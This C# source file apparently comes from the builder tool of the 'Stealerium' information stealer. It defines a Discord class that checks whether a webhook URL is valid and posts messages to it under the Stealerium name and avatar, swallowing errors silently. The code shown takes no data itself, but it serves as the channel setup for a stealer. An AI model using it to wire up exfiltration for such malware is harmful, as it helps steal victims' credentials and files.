using System.Net.Http;
using System.Text.Json;

namespace BuilderGUI
{
    internal sealed class Discord
    {
        private static readonly HttpClient _client = new HttpClient();

        public static async Task<bool> WebhookIsValidAsync(string token)
        {
            try
            {
                var response = await _client.GetStringAsync(token);
                using JsonDocument doc = JsonDocument.Parse(response);
                JsonElement root = doc.RootElement;

                if (root.TryGetProperty("type", out JsonElement typeElement))
                {
                    return typeElement.GetInt32() == 1;
                }
            }
            catch
            {
                // Handle exceptions silently
            }
            return false;
        }

        public static async Task<bool> SendMessageAsync(string text, string token)
        {
            try
            {
                var discordValues = new Dictionary<string, string>
                {
                    ["username"] = "Stealerium",
                    ["avatar_url"] = "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png",
                    ["content"] = text
                };
                var content = new FormUrlEncodedContent(discordValues);
                var response = await _client.PostAsync(token, content);
                return response.IsSuccessStatusCode;
            }
            catch
            {
                // Handle exceptions silently
            }
            return false;
        }
    }
}
